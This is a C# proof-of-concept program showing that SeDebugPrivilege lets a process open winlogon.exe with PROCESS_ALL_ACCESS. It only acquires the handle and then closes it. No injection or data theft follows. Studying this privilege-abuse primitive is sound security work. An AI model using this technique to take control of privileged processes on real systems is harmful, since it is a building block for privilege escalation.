using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

namespace SeDebugPrivilegePoC
{
    class SeDebugPrivilegePoC
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern uint FormatMessage(
            uint dwFlags, 
            IntPtr lpSource,
            int dwMessageId, 
            int dwLanguageId, 
            StringBuilder lpBuffer,
            uint nSize, 
            IntPtr Arguments);

        [DllImport("kernel32", SetLastError = true)]
        static extern bool FreeLibrary(IntPtr hLibModule);

        [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern IntPtr LoadLibrary(string lpFileName);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr OpenProcess(
            uint processAccess,
            bool bInheritHandle,
            int processId);

        const uint PROCESS_ALL_ACCESS = 0x001F0FFF;

        static string GetWin32ErrorMessage(int code)
        {
            uint FORMAT_MESSAGE_FROM_HMODULE = 0x00000800;
            uint FORMAT_MESSAGE_FROM_SYSTEM = 0x00001000;
            StringBuilder message = new StringBuilder(255);

            IntPtr pNtdll = LoadLibrary("ntdll.dll");

            uint status = FormatMessage(
                FORMAT_MESSAGE_FROM_HMODULE | FORMAT_MESSAGE_FROM_SYSTEM,
                pNtdll,
                code,
                0,
                message,
                255,
                IntPtr.Zero);

            FreeLibrary(pNtdll);

            if (status == 0)
            {
                return string.Format("[ERROR] Code 0x{0}", code.ToString("X8"));
            }
            else
            {
                return string.Format("[ERROR] Code 0x{0} : {1}",
                    code.ToString("X8"),
                    message.ToString().Trim());
            }
        }

        static IntPtr OpenWinlogonHandle()
        {
            int winlogon;
            int error;

            Console.WriteLine("[*] If you have SeDebugPrivilege, you can get handle to any privileged process such winlogon.exe.");

            Console.WriteLine("[>] Searching winlogon PID.");

            try
            {
                winlogon = (Process.GetProcessesByName("winlogon")[0]).Id;
            }
            catch
            {
                Console.WriteLine("[-] Failed to get process ID of winlogon.");
                return IntPtr.Zero;
            }

            Console.WriteLine("[+] PID of winlogon: {0}", winlogon);
            Console.WriteLine("[>] Trying to get handle to winlogon.");

            IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, winlogon);

            if (hProcess == IntPtr.Zero)
            {
                error = Marshal.GetLastWin32Error();
                Console.WriteLine("[-] Failed to get a winlogon handle.");
                Console.WriteLine("    |-> {0}", GetWin32ErrorMessage(error));
                return IntPtr.Zero;
            }

            return hProcess;
        }

        static void Main()
        {
            IntPtr hProcess = OpenWinlogonHandle();

            if (hProcess != IntPtr.Zero)
            {
                Console.WriteLine("[+] Got handle to winlogon with PROCESS_ALL_ACCESS (hProcess = 0x{0}).", hProcess.ToString("X"));
                Console.WriteLine("\n[*] To close the handle and exit this program, hit [ENTER] key.");
                Console.ReadLine();

                CloseHandle(hProcess);
            }
        }
    }
}
